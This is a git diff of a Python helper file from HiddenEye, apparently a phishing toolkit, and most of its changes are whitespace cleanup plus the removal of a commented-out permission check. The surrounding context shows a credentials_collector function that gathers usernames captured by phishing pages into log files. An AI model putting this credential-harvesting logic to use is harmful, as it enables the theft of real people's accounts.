@@ -22,7 +22,6 @@ def license_handler():
         boolean: Returns True if "eula = True" is inside eula.txt, False by default.
     """
     eula = pathlib_Path("eula.txt")
-    
     if eula.exists():
         eula = eula.open('r')
         with open('eula.txt', 'r') as f:
@@ -74,8 +73,8 @@ def exit_message(port = 80):  # Message when HiddenEye exit
         run_command('clear')
         return exit_message(port)
 
-def terms_of_service_message():  
-    """Requests user to provide agreement to license provided. 
+def terms_of_service_message():
+    """Requests user to provide agreement to license provided.
 
     Returns:
         boolean: Always returns True, if user doesn't accept agreement - proceeds to exit()
@@ -97,7 +96,7 @@ def terms_of_service_message():
             return True
     else:
         return True
-            
+
 def module_loading_message(option_name):  # This one just show text..
     """Prints "Select any mode" message.  """
     print(option_name + localization.lang_module_loading_message["is_loaded"])
@@ -113,7 +112,6 @@ def credentials_collector():
             if len(lines) != 0:
                 log_writer(localization.lang_credentials_collector["credentials_found"] + "{0}{2}{1}".format(default_palette[2], default_palette[3], lines))
                 pathlib_Path("Server/CapturedData/usernames.txt").touch(mode=0o777, exist_ok=True)
-                
                 captured_usernames = open('Server/CapturedData/usernames.txt', 'a')
                 new_usernames = open('Server/www/usernames.txt')
                 captured_usernames.write(new_usernames.read())
@@ -230,18 +228,6 @@ def verify_connection(host='https://dark-sec-official.com'):  # Connection check
         exit()
 
 def check_permissions():
-
-  #  if platform_os() != "Windows":
-  #      if getuid() == 0:
-  #          print(localization.lang_check_permissions["permissions_granted"])
-  #      else:
-  #         print(localization.lang_check_permissions["permissions_denied"])
-  #          exit()
-  #  else:
-  #     print(localization.lang_check_permissions["windows_warning"])
-  #      exit()
-## Everything above will be replaced ##
-
     if check_platform("system") == "Linux":
         if getuid() == 0:
             print(localization.lang_check_permissions["permissions_granted"])
